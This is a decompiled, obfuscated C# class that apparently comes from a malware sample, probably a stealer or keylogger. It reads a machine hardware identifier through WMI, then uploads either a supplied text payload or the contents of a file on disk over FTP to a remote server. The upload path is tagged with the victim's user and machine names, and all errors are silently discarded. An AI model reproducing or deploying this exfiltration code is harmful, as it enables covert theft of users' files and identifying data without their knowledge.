using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

internal sealed class YarXNhsRIUck
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string FgehTUZSzpVn()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107410861));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107410840)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107410791);
			ManagementObject val3 = new ManagementObject(getString_0(107410786) + text2 + getString_0(107410777));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107410772)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389182) : text;
		}
	}

	public static void MHjVmifCqLAcb(string iIrwOGooMGnXLg = "URL", string EHTGeELmzdcjVZ = "USERNAME", string cGLYNCWQLqAV = "ACCESO", string HTlXuUcifyimv = "")
	{
		try
		{
			string text = FgehTUZSzpVn();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(iIrwOGooMGnXLg + getString_0(107412716) + Environment.UserName + getString_0(107413183) + Environment.MachineName + getString_0(107413162) + text + getString_0(107413157));
			ftpWebRequest.Method = getString_0(107410715);
			ftpWebRequest.Credentials = new NetworkCredential(EHTGeELmzdcjVZ, cGLYNCWQLqAV);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(HTlXuUcifyimv);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void ZqWoMKKMhbIQyDVFg(string cSeCLFhnVUwRAI = "URL", string flqgGaPqWzbDVVC = "USERNAME", string THhNRYELJnWPv = "ACCESO", string zIOkVeBodPs = "")
	{
		try
		{
			string text = FgehTUZSzpVn();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(cSeCLFhnVUwRAI + getString_0(107412716) + Environment.UserName + getString_0(107413183) + Environment.MachineName + getString_0(107413162) + text + getString_0(107413162) + Path.GetFileName(zIOkVeBodPs));
			ftpWebRequest.Method = getString_0(107410715);
			ftpWebRequest.Credentials = new NetworkCredential(flqgGaPqWzbDVVC, THhNRYELJnWPv);
			byte[] array = File.ReadAllBytes(zIOkVeBodPs);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static YarXNhsRIUck()
	{
		Strings.CreateGetStringDelegate(typeof(YarXNhsRIUck));
	}
}
